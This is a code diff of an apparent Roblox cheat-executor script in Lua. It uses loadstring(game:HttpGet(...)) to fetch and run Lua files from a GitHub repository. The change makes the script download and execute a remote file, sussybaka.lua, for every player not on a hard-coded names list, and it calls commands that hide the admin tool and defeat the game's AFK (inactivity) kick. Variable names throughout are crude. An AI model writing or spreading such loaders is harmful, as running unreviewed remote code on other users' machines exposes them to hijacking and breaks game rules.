@@ -2,23 +2,9 @@ spawn(function()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/fh.lua'))()
 end)
 
+
 spawn(function()
-
-local sexxD = {
-3978370137, -- gpo
-6360478118, -- gpo universe hub
-1730877806, -- gpo main menu
-2809202155, -- yba
-5094651510 -- demonfall
-}
-
-for anal,sex in pairs(sexxD) do
-if game['PlaceId'] == v then 
-
-game.Loaded:Wait()
-
-wait(5)
-
+    game.Loaded:Wait()
 local lp = game:GetService('Players').LocalPlayer
 
 local names = {
@@ -27,7 +13,21 @@ local names = {
 }
 
 for i,v in pairs(names) do
-if v.Name == lp.Name then
+if v.Name ~= lp.Name then
+
+if peenis then return end
+    
+getgenv().peenis = true
+    
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/sussybaka.lua'))()
+execCmd('hideiy')
+execCmd('antiafk')
+else
+    getgenv().ligma = true
+    end
+end		
+    
+if not ligma then
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Destroy = Instance.new("TextButton")
@@ -64,15 +64,6 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/
 execCmd('hideiy')
 execCmd('antiafk')
 end)
-getgenv().ligma = true
-    end
-end		
-
-if not ligma then
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/sussybaka.lua'))()
-execCmd('hideiy')
-execCmd('antiafk')
-end
 
 getgenv().ws = false
 
@@ -86,7 +77,6 @@ end
 
 game.Players.LocalPlayer.CharacterAdded:Connect(sus)
 sus()
-        end
     end
 end)
 
